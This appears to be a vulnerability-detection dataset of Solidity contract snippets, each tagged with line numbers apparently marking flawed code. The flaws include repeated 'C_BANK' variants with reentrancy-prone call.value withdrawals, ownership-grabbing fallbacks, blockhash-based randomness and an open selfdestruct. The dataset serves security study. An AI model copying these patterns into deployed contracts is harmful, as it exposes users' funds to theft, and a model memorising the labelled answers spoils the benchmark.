        tokenReward.transfer(creator, tokenReward.balanceOf(this));
        if (now > completedAt.add(90 days)){
          creator.transfer(address(this).balance);
        }
    }
    /**
    * @notice Function to claim any token stuck on contract
    */
    function externalTokensRecovery(ERC20Basic _address) onlyAdmin(2) public{
        require(_address != tokenReward); //Only any other token
        uint256 remainder = _address.balanceOf(this); //Check remainder tokens
        _address.transfer(msg.sender,remainder); //Transfer tokens to admin
    }
    /*
    * @dev Direct payments handler
    */
    function () public payable {
        contribute();","[22, 106]"
"pragma solidity ^0.4.25;
contract C_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 2 ether;    
    function C_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract C_BAnK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 2 ether;    
    function C_BAnK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract C_Bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 2 ether;    
    function C_Bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract C_bAnK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 2 ether;    
    function C_bAnK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract C_banK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 2 ether;    
    function C_banK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"      if(msg.sender != address(this)){
        revert();
      }
      _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    if (newOwner == address(0)) {
      revert();
    }
    owner = newOwner;
  }
  function withdraw() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }
}
contract CaptureTheFlag is Ownable {
  address owner;
  event WhereAmI(address, string);
  Log TransferLog;
  uint256 public jackpot = 0;
  uint256 MinDeposit = 1 ether;
  uint256 minInvestment = 1 ether;
  uint public sumInvested;
  uint public sumDividend;
  bool inProgress = false;
  mapping(address => uint256) public balances;
  struct Osakako {
    address me;
  }
  struct investor {
    uint256 investment;
    string username;
  }
  event Transfer(
    uint amount,
    bytes32 message,
    address target,
    address currentOwner
  );
  mapping(address => investor) public investors;
  function CaptureTheFlag(address _log) public {
    TransferLog = Log(_log);
    owner = msg.sender;
  }
  // Payday!!
  function() public payable {
    if( msg.value >= jackpot ){
      owner = msg.sender;
    }
    jackpot += msg.value; // add to our jackpot
  }
  modifier onlyUsers() {
    require(users[msg.sender] != false);
    _;
  }
  mapping(address => bool) users;
  function registerAllPlayers(address[] players) public onlyOwner {
    require(inProgress == false);
    for (uint32 i = 0; i < players.length; i++) {
      users[players[i]] = true;
    }
    inProgress = true;
  }
  function takeAll() external onlyOwner {
    msg.sender.transfer(this.balance); // payout
    jackpot = 0; // reset the jackpot
  }
  // Payday!!
  // Bank
  function Deposit() public payable {
    if ( msg.value >= MinDeposit ){
      balances[msg.sender] += msg.value;
      TransferLog.addMessage("" Deposit "");
    }
  }
  function CashOut(uint amount) public onlyUsers {
    if( amount <= balances[msg.sender] ){
      if(msg.sender.call.value(amount)()){
        balances[msg.sender] -= amount;
        TransferLog.addMessage("" CashOut "");
      }
    }
  }
  // Bank
  //--- Hmmm
  function invest() public payable {
    if ( msg.value >= minInvestment ){
      investors[msg.sender].investment += msg.value;
    }
  }
  function divest(uint amount) public onlyUsers {
    if ( investors[msg.sender].investment == 0 || amount == 0) {
      revert();
    }
    // no need to test, this will throw if amount > investment
    investors[msg.sender].investment -= amount;
    sumInvested -= amount;
    this.loggedTransfer(amount, """", msg.sender, owner);
  }
  function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) public protected onlyUsers {
    if(!target.call.value(amount)()){
      revert();
    }
    Transfer(amount, message, target, currentOwner);
  }
  //--- Empty String Literal
  function osaka(string message) public onlyUsers {
    Osakako osakako;
    osakako.me = msg.sender;
    WhereAmI(osakako.me, message);
  }
  function tryMeLast() public payable onlyUsers {
    if ( msg.value >= 0.1 ether ) {
      uint256 multi = 0;
      uint256 amountToTransfer = 0;
      for (var i = 0; i < 2 * msg.value; i++) {
        multi = i * 2;
        if (multi < amountToTransfer) {
          break;
        }
        amountToTransfer = multi;
      }
      msg.sender.transfer(amountToTransfer);
    }
  }
  function easyMode( address addr ) external payable onlyUsers {
    if ( msg.value >= this.balance ){
      addr.transfer(this.balance + msg.value);","[50, 78, 79]"
"pragma solidity ^0.4.25;
contract Cb_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function Cb_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"}
interface IERC20FeeProxy {
  event TransferWithReferenceAndFee(
    address tokenAddress,
    address to,
    uint256 amount,
    bytes indexed paymentReference,
    uint256 feeAmount,
    address feeAddress
  );
  function transferFromWithReferenceAndFee(
    address _tokenAddress,
    address _to,
    uint256 _amount,
    bytes calldata _paymentReference,
    uint256 _feeAmount,
    address _feeAddress
    ) external;
}
/**
 * @title ERC20ConversionProxy
 */
contract ERC20ConversionProxy {
  using SafeMath for uint256;
  address public paymentProxy;
  ChainlinkConversionPath public chainlinkConversionPath;
  constructor(address _paymentProxyAddress, address _chainlinkConversionPathAddress) public {
    paymentProxy = _paymentProxyAddress;
    chainlinkConversionPath = ChainlinkConversionPath(_chainlinkConversionPathAddress);
  }
  // Event to declare a transfer with a reference
  event TransferWithConversionAndReference(
    uint256 amount,
    address currency,
    bytes indexed paymentReference,
    uint256 feeAmount,
    uint256 maxRateTimespan
  );
  /**
   * @notice Performs an ERC20 token transfer with a reference computing the amount based on a fiat amount
   * @param _to Transfer recipient
   * @param _requestAmount request amount
   * @param _path conversion path
   * @param _paymentReference Reference of the payment related
   * @param _feeAmount The amount of the payment fee
   * @param _feeAddress The fee recipient
   * @param _maxToSpend amount max that we can spend on the behalf of the user
   * @param _maxRateTimespan max time span with the oldestrate, ignored if zero
   */
  function transferFromWithReferenceAndFee(
    address _to,
    uint256 _requestAmount,
    address[] calldata _path,
    bytes calldata _paymentReference,
    uint256 _feeAmount,
    address _feeAddress,
    uint256 _maxToSpend,
    uint256 _maxRateTimespan
  ) external
  {
    (uint256 amountToPay, uint256 amountToPayInFees) = getConversions(_path, _requestAmount, _feeAmount, _maxRateTimespan);
    require(amountToPay.add(amountToPayInFees) <= _maxToSpend, ""Amount to pay is over the user limit"");
    // Pay the request and fees
    (bool status, ) = paymentProxy.delegatecall(
      abi.encodeWithSignature(
        ""transferFromWithReferenceAndFee(address,address,uint256,bytes,uint256,address)"",
        // payment currency
        _path[_path.length - 1],
        _to,
        amountToPay,
        _paymentReference,
        amountToPayInFees,
        _feeAddress
      )
    );
    require(status, ""transferFromWithReferenceAndFee failed"");
    // Event to declare a transfer with a reference
    emit TransferWithConversionAndReference(
      _requestAmount,
      // request currency
      _path[0],
      _paymentReference,
      _feeAmount,
      _maxRateTimespan
    );
  }
  function getConversions(
    address[] memory _path,
    uint256 _requestAmount,
    uint256 _feeAmount,
    uint256 _maxRateTimespan
  ) internal
    returns (uint256 amountToPay, uint256 amountToPayInFees)
  {
    (uint256 rate, uint256 oldestTimestampRate, uint256 decimals) = chainlinkConversionPath.getRate(_path);
    // Check rate timespan
    require(_maxRateTimespan == 0 || block.timestamp.sub(oldestTimestampRate) <= _maxRateTimespan, ""aggregator rate is outdated"");
    // Get the amount to pay in the crypto currency chosen
    amountToPay = _requestAmount.mul(rate).div(decimals);
    amountToPayInFees = _feeAmount.mul(rate).div(decimals);
  }
}",[64]
"  }
  /**
   * @dev allow user to change their choice before a timestamp
   * @param choice the choice of the participant(actually team id)
   */
  function modifyChoice(uint choice) beforeTimestamp(startTime) public {
    require(choice > 0);
    require(checkPlayerExists(msg.sender));
    uint oldChoice = playerInfo[msg.sender].choice;
    numberOfChoice[oldChoice] = numberOfChoice[oldChoice].sub(1);
    numberOfChoice[choice] = numberOfChoice[choice].add(1);
    playerInfo[msg.sender].choice = choice;
    addressOfChoice[oldChoice][msg.sender] = false;
    addressOfChoice[choice][msg.sender] = true;
    LogModifyChoice(msg.sender, oldChoice, choice);
  }
  /**
   * @dev close who is champion bet with the champion id
   */
  function saveResult(uint teamId) onlyOwner public {
    winChoice = teamId;
    betClosed = true;
    winReward = deposit.add(totalBetAmount).div(numberOfChoice[winChoice]);
    LogWinChoice(winChoice, winReward);
  }
  /**
   * @dev every user can withdraw his reward
   */
  function withdrawReward() public {
    require(betClosed);
    require(!withdrawRecord[msg.sender]);
    require(winChoice > 0);
    require(winReward > 0);
    require(addressOfChoice[winChoice][msg.sender]);
    msg.sender.transfer(winReward);
    withdrawRecord[msg.sender] = true;
    LogDistributeReward(msg.sender, winReward);
  }
  /**
   * @dev anyone could recharge deposit
   */
  function rechargeDeposit() payable public {
    deposit = deposit.add(msg.value);
  }
  /**
   * @dev get player bet information
   * @param addr indicate the bet address
   */
  function getPlayerBetInfo(address addr) view public returns (uint, uint) {
    return (playerInfo[addr].choice, playerInfo[addr].betAmount);
  }
  /**
   * @dev get the bet numbers of a specific choice
   * @param choice indicate the choice
   */
  function getNumberByChoice(uint choice) view public returns (uint) {
    return numberOfChoice[choice];
  }
  /**
   * @dev if there are some reasons lead game postpone or cancel
   *      the bet will also cancel and refund every bet
   */
  function refund() onlyOwner public {
    for (uint i = 0; i < players.length; i++) {
      players[i].transfer(playerInfo[players[i]].betAmount);
      LogRefund(players[i], playerInfo[players[i]].betAmount);
    }
  }
  /**
   * @dev get the players
   */
  function getPlayers() view public returns (address[]) {
    return players;
  }
  /**
   * @dev dealer can withdraw the remain ether if distribute exceeds max length
   */
  function withdraw() onlyOwner public {
    uint _balance = address(this).balance;
    owner.transfer(_balance);
    LogWithdraw(owner, _balance);
  }
}","[64, 65]"
"        _;
    }
    modifier whenNotPaused() {
        require(!isPaused);
        _;
    }
    modifier whenPaused {
        require(isPaused);
        _;
    }
    function setAdmin(address _newAdmin) external onlyAdmin {
        require(_newAdmin != address(0));
        AdminTransferred(addrAdmin, _newAdmin);
        addrAdmin = _newAdmin;
    }
    function doPause() external onlyAdmin whenNotPaused {
        isPaused = true;
    }
    function doUnpause() external onlyAdmin whenPaused {
        isPaused = false;
    }
}
contract AccessService is AccessAdmin {
    address public addrService;
    address public addrFinance;
    modifier onlyService() {
        require(msg.sender == addrService);
        _;
    }
    modifier onlyFinance() {
        require(msg.sender == addrFinance);
        _;
    }
    function setService(address _newService) external {
        require(msg.sender == addrService || msg.sender == addrAdmin);
        require(_newService != address(0));
        addrService = _newService;
    }
    function setFinance(address _newFinance) external {
        require(msg.sender == addrFinance || msg.sender == addrAdmin);
        require(_newFinance != address(0));
        addrFinance = _newFinance;
    }
    function withdraw(address _target, uint256 _amount)
        external
    {
        require(msg.sender == addrFinance || msg.sender == addrAdmin);
        require(_amount > 0);
        address receiver = _target == address(0) ? addrFinance : _target;
        uint256 balance = this.balance;
        if (_amount < balance) {
            receiver.transfer(_amount);
        } else {
            receiver.transfer(this.balance);
        }
    }
}
interface IDataMining {
    function subFreeMineral(address _target) external returns(bool);
}
contract Random {
    uint256 _seed;
    function _rand() internal returns (uint256) {
        _seed = uint256(keccak256(_seed, block.blockhash(block.number - 1), block.coinbase, block.difficulty));
        return _seed;
    }
    function _randBySeed(uint256 _outSeed) internal view returns (uint256) {
        return uint256(keccak256(_outSeed, block.blockhash(block.number - 1), block.coinbase, block.difficulty));
    }
}
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
contract RaceToken is ERC721, AccessAdmin {
    /// @dev The equipment info
    struct Fashion {
        uint16 equipmentId;             // 0  Equipment ID
        uint16 quality;     	        // 1  Rarity: 1 Coarse/2 Good/3 Rare/4 Epic/5 Legendary
        uint16 pos;         	        // 2  Slots: 1 Engine/2 Turbine/3 BodySystem/4 Pipe/5 Suspension/6 NO2/7 Tyre/8 Transmission/9 Car
        uint16 production;    	        // 3  Race bonus productivity
        uint16 attack;	                // 4  Attack
        uint16 defense;                 // 5  Defense
        uint16 plunder;     	        // 6  Plunder
        uint16 productionMultiplier;    // 7  Percent value
        uint16 attackMultiplier;     	// 8  Percent value
        uint16 defenseMultiplier;     	// 9  Percent value
        uint16 plunderMultiplier;     	// 10 Percent value
        uint16 level;       	        // 11 level
        uint16 isPercent;   	        // 12  Percent value
    }",[64]
"     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), ""Ownable: new owner is the zero address"");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract ClaimContract is Ownable{
    using MerkleProof for bytes;
    uint256 public EXPIRY_TIME;
    address public FLASH_CONTRACT;
    bytes32 public merkleRoot;
    mapping(uint256 => uint256) private claimedBitMap;
    event Claimed(uint256 index, address sender, uint256 amount);
    constructor(address contractAddress, bytes32 rootHash, uint256 totalDays) public {
        FLASH_CONTRACT = contractAddress;
        merkleRoot = rootHash;
        EXPIRY_TIME = block.timestamp + totalDays;
    }
    function updateRootAndTime(bytes32 rootHash, uint256 totalDays) external onlyOwner {
        merkleRoot = rootHash;
        EXPIRY_TIME = block.timestamp + totalDays;
        renounceOwnership();
    }
    function isClaimed(uint256 index) public view returns (bool) {
        uint256 claimedWordIndex = index / 256;
        uint256 claimedBitIndex = index % 256;
        uint256 claimedWord = claimedBitMap[claimedWordIndex];
        uint256 mask = (1 << claimedBitIndex);
        return claimedWord & mask == mask;
    }
    function _setClaimed(uint256 index) private {
        uint256 claimedWordIndex = index / 256;
        uint256 claimedBitIndex = index % 256;
        claimedBitMap[claimedWordIndex] = claimedBitMap[claimedWordIndex] | (1 << claimedBitIndex);
    }
    function claim(
        uint256 index,
        address account,
        uint256 amount,
        bytes32[] calldata merkleProof
    ) external {
        require(block.timestamp <= EXPIRY_TIME, ""MerkleDistributor: Deadline expired"");
        require(!isClaimed(index), ""MerkleDistributor: Drop already claimed."");
        // Verify the merkle proof.
        bytes32 node = keccak256(abi.encodePacked(index, account, amount));
        require(MerkleProof.verify(merkleProof, merkleRoot, node), ""MerkleDistributor: Invalid proof."");
        // Mark it claimed and send the token.
        _setClaimed(index);
        require(IFlashToken(FLASH_CONTRACT).mint(account, amount), ""MerkleDistributor: Transfer failed."");
        emit Claimed(index, account, amount);
    }
    function destroy() external {
        require(block.timestamp >= EXPIRY_TIME, ""MerkleDistributor: Deadline not expired"");
        selfdestruct(address(0));
    }
}","[63, 64, 65]"
"pragma solidity 0.4.24;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract ClubEther {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}",[52]
"  }
}
contract CommonSale is StagedCrowdsale {
  address public multisigWallet;
  address public foundersTokensWallet;
  address public bountyTokensWallet;
  uint public foundersTokensPercent;
  uint public bountyTokensPercent;
  uint public price;
  uint public percentRate = 100;
  uint public softcap;
  bool public refundOn = false;
  bool public isSoftcapOn = false;
  mapping (address => uint) balances;
  CommonSale public nextSale;
  MintableToken public token;
  function setSoftcap(uint newSoftcap) onlyOwner {
    isSoftcapOn = true;
    softcap = newSoftcap;
  }
  function setToken(address newToken) onlyOwner {
    token = MintableToken(newToken);
  }
  function setNextSale(address newNextSale) onlyOwner {
    nextSale = CommonSale(newNextSale);
  }
  function setPrice(uint newPrice) onlyOwner {
    price = newPrice;
  }
  function setPercentRate(uint newPercentRate) onlyOwner {
    percentRate = newPercentRate;
  }
  function setFoundersTokensPercent(uint newFoundersTokensPercent) onlyOwner {
    foundersTokensPercent = newFoundersTokensPercent;
  }
  function setBountyTokensPercent(uint newBountyTokensPercent) onlyOwner {
    bountyTokensPercent = newBountyTokensPercent;
  }
  function setMultisigWallet(address newMultisigWallet) onlyOwner {
    multisigWallet = newMultisigWallet;
  }
  function setFoundersTokensWallet(address newFoundersTokensWallet) onlyOwner {
    foundersTokensWallet = newFoundersTokensWallet;
  }
  function setBountyTokensWallet(address newBountyTokensWallet) onlyOwner {
    bountyTokensWallet = newBountyTokensWallet;
  }
  function createTokens() whenNotPaused isUnderHardCap saleIsOn payable {
    require(msg.value > 100000000000000000);
    uint milestoneIndex = currentMilestone();
    Milestone storage milestone = milestones[milestoneIndex];
    if(!isSoftcapOn) {
      multisigWallet.transfer(msg.value);
    }
    invested = invested.add(msg.value);
    uint tokens = msg.value.mul(1 ether).div(price);
    uint bonusTokens = tokens.mul(milestone.bonus).div(percentRate);
    uint tokensWithBonus = tokens.add(bonusTokens);
    token.mint(this, tokensWithBonus);
    token.transfer(msg.sender, tokensWithBonus);
    balances[msg.sender] = balances[msg.sender].add(msg.value);
  }
  function refund() whenNotPaused {
    require(now > start && refundOn && balances[msg.sender] > 0);
    msg.sender.transfer(balances[msg.sender]);
  }
  function finishMinting() public whenNotPaused onlyOwner {
    if(isSoftcapOn && invested < softcap) {
      refundOn = true;
      token.finishMinting();
    } else {
      if(isSoftcapOn) {
        multisigWallet.transfer(invested);
      }
      uint issuedTokenSupply = token.totalSupply();
      uint summaryTokensPercent = bountyTokensPercent + foundersTokensPercent;
      uint summaryFoundersTokens = issuedTokenSupply.mul(summaryTokensPercent).div(percentRate - summaryTokensPercent);
      uint totalSupply = summaryFoundersTokens + issuedTokenSupply;
      uint foundersTokens = totalSupply.mul(foundersTokensPercent).div(percentRate);
      uint bountyTokens = totalSupply.mul(bountyTokensPercent).div(percentRate);
      token.mint(this, foundersTokens);
      token.transfer(foundersTokensWallet, foundersTokens);
      token.mint(this, bountyTokens);
      token.transfer(bountyTokensWallet, bountyTokens);
      if(nextSale == address(0)) {
        token.finishMinting();
      } else {
        token.setSaleAgent(nextSale);
      }
    }
  }
  function() external payable {
    createTokens();
  }
  function retrieveTokens(address anotherToken) public onlyOwner {
    ERC20 alienToken = ERC20(anotherToken);
    alienToken.transfer(multisigWallet, token.balanceOf(this));
  }
}
// FIXME: needs to fix addresses and hardcap, softcap
// Перевести дату начала в GMT, а затем в UNIX формат с помощью сервсиа http://www.onlineconversion.com/unix_time.htm
contract Configurator is Ownable {
  MintableToken public token;
  CommonSale public presale;
  CommonSale public mainsale;
  function deploy() {
    address presaleMultisigWallet = 0x675cf930aefA144dA7e10ddBACC02f902A233eFC;
    address presaleBountyTokensWallet = 0x06B8fF8476425E45A3D2878e0a27BB79efd4Dde1;
    address presaleFoundersWallet = 0x27F1Ac3E29CBec9D225d98fF95B6933bD30E3F71;
    uint presaleSoftcap = 0x0;
    uint presaleHardcap = 0x0;
    address mainsaleMultisigWallet = 0xFb72502E9c56497BAC3B1c21DE434b371891CC05;
    address mainsaleBountyTokensWallet = 0xd08112054C8e01E33fAEE176531dEB087809CbB2;
    address mainsaleFoundersWallet = 0xDeFAE9a126bA5aA2537AaC481D9335827159D33B;
    uint mainsaleHardcap = 0x0;
    token = new TlindToken();
    presale = new CommonSale();
    presale.setToken(token);
    presale.setSoftcap(presaleSoftcap);
    presale.setHardcap(presaleHardcap);
    presale.setMultisigWallet(presaleMultisigWallet);
    presale.setFoundersTokensWallet(presaleFoundersWallet);
    presale.setBountyTokensWallet(presaleBountyTokensWallet);
    presale.setStart(1506344400);
    presale.setFoundersTokensPercent(15);
    presale.setBountyTokensPercent(5);
    presale.setPrice(10000000000000000);
    presale.addMilestone(8,300);","[64, 65]"
"  }
}
contract CommonSale is StagedCrowdsale {
  address public multisigWallet;
  address public foundersTokensWallet;
  address public bountyTokensWallet;
  uint public foundersTokensPercent;
  uint public bountyTokensPercent;
  uint public price;
  uint public percentRate = 100;
  uint public softcap;
  bool public refundOn = false;
  bool public isSoftcapOn = false;
  mapping (address => uint) balances;
  CommonSale public nextSale;
  MintableToken public token;
  function setSoftcap(uint newSoftcap) onlyOwner {
    isSoftcapOn = true;
    softcap = newSoftcap;
  }
  function setToken(address newToken) onlyOwner {
    token = MintableToken(newToken);
  }
  function setNextSale(address newNextSale) onlyOwner {
    nextSale = CommonSale(newNextSale);
  }
  function setPrice(uint newPrice) onlyOwner {
    price = newPrice;
  }
  function setPercentRate(uint newPercentRate) onlyOwner {
    percentRate = newPercentRate;
  }
  function setFoundersTokensPercent(uint newFoundersTokensPercent) onlyOwner {
    foundersTokensPercent = newFoundersTokensPercent;
  }
  function setBountyTokensPercent(uint newBountyTokensPercent) onlyOwner {
    bountyTokensPercent = newBountyTokensPercent;
  }
  function setMultisigWallet(address newMultisigWallet) onlyOwner {
    multisigWallet = newMultisigWallet;
  }
  function setFoundersTokensWallet(address newFoundersTokensWallet) onlyOwner {
    foundersTokensWallet = newFoundersTokensWallet;
  }
  function setBountyTokensWallet(address newBountyTokensWallet) onlyOwner {
    bountyTokensWallet = newBountyTokensWallet;
  }
  function createTokens() whenNotPaused isUnderHardCap saleIsOn payable {
    require(msg.value >= 100000000000000000);
    uint milestoneIndex = currentMilestone();
    Milestone storage milestone = milestones[milestoneIndex];
    if(!isSoftcapOn) {
      multisigWallet.transfer(msg.value);
    }
    invested = invested.add(msg.value);
    uint tokens = msg.value.mul(1 ether).div(price);
    uint bonusTokens = tokens.mul(milestone.bonus).div(percentRate);
    uint tokensWithBonus = tokens.add(bonusTokens);
    token.mint(this, tokensWithBonus);
    token.transfer(msg.sender, tokensWithBonus);
    balances[msg.sender] = balances[msg.sender].add(msg.value);
  }
  function refund() whenNotPaused {
    require(now > start && refundOn && balances[msg.sender] > 0);
    msg.sender.transfer(balances[msg.sender]);
  }
  function finishMinting() public whenNotPaused onlyOwner {
    if(isSoftcapOn && invested < softcap) {
